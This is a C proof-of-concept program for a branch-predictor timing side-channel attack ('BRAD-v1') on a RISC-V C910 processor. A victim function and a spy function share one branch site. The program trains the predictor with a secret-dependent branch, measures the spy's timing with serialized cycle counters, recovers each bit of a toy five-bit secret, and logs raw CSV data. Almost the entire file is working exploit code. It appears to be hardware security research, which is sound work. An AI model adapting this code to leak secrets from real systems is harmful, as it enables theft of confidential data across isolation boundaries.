// brad_v1_same_site_logger.c
// BRAD-v1 on C910: single shared branch site + differential probing + raw CSV logging.

#include <stdio.h>
#include <stdint.h>

#define SECRET_LEN       5
#define ATTACK_ROUNDS    40
#define TRAINING_REPS    32         // stronger training to saturate predictor
#define PROBE_SAMPLES    600        // more samples per probe value

volatile uint8_t sec[SECRET_LEN] = {1,0,0,1,0};
volatile uint8_t array1[1]       = {1};

/* --- timing --- */
static inline uint64_t rdcycle_serialized(void) {
    uint64_t v;
    asm volatile("fence iorw, iorw" ::: "memory");
    asm volatile("rdcycle %0" : "=r"(v));
    asm volatile("fence iorw, iorw" ::: "memory");
    return v;
}

/* --- the ONE branch site used by both victim & spy --- */
/* never inline/clone, separate section, and aligned to keep I$ effects stable */
__attribute__((noinline, no_clone, section(".text.brad_site"), aligned(64)))
void branch_site(volatile uint8_t *addr) {
    /* small asymmetry to create a measurable delta */
    if (*addr) {
        asm volatile("nop; nop; nop; nop; nop; nop");
    } else {
        asm volatile("addi t1, zero, 2; nop; nop");
    }
}

/* wrappers only pass different addresses; DO NOT inline so the call/return is the same */
__attribute__((noinline, no_clone))
void victim_f(unsigned idx) {
    branch_site(&sec[idx]);   // secret controls the branch
}

__attribute__((noinline, no_clone))
void spy_f(void) {
    branch_site(&array1[0]);  // attacker controls the branch
}

/* measure spy for (v) PROBE_SAMPLES times; return total cycles */
static uint64_t measure_spy_total(uint8_t v, unsigned samples) {
    uint64_t sum = 0, t0, t1;
    array1[0] = v;

    /* small serializing barrier to separate training from probing */
    asm volatile("" ::: "memory");
    for (unsigned i = 0; i < samples; ++i) {
        t0 = rdcycle_serialized();
        spy_f();
        t1 = rdcycle_serialized();
        sum += (t1 - t0);
    }
    return sum;
}

int main(void) {
    printf("BRAD-v1 (C910) — single-site branch, differential probe, raw CSV\n");
    printf("Params: ATTACK_ROUNDS=%d TRAINING_REPS=%d PROBE_SAMPLES=%d\n", ATTACK_ROUNDS, TRAINING_REPS, PROBE_SAMPLES);
    printf("Secret: ");
    for (unsigned i=0;i<SECRET_LEN;i++) printf("%u ", sec[i]);
    printf("\n\n");

    /* CSV header */
    printf("csv_header,idx,round,sum1,sum0\n");

    for (unsigned idx = 0; idx < SECRET_LEN; ++idx) {
        uint64_t total1 = 0, total0 = 0;

        for (unsigned r = 0; r < ATTACK_ROUNDS; ++r) {
            /* train the predictor at the SAME branch site with the real secret */
            for (unsigned t = 0; t < TRAINING_REPS; ++t)
                victim_f(idx);

            /* differential probe */
            uint64_t sum1 = measure_spy_total(1, PROBE_SAMPLES);
            uint64_t sum0 = measure_spy_total(0, PROBE_SAMPLES);

            total1 += sum1;
            total0 += sum0;

            /* raw CSV so we can see distribution overlap */
            printf("csv,%u,%u,%llu,%llu\n", idx, r,
                   (unsigned long long)sum1, (unsigned long long)sum0);
        }

        double mean1 = (double)total1 / (double)(ATTACK_ROUNDS * PROBE_SAMPLES);
        double mean0 = (double)total0 / (double)(ATTACK_ROUNDS * PROBE_SAMPLES);
        int recovered = (mean1 < mean0) ? 1 : 0;

        printf("Index %u: mean_probe(1)=%.3f cycles  mean_probe(0)=%.3f cycles  => recovered=%d (actual=%u)\n\n",
               idx, mean1, mean0, recovered, sec[idx]);
    }
    return 0;
}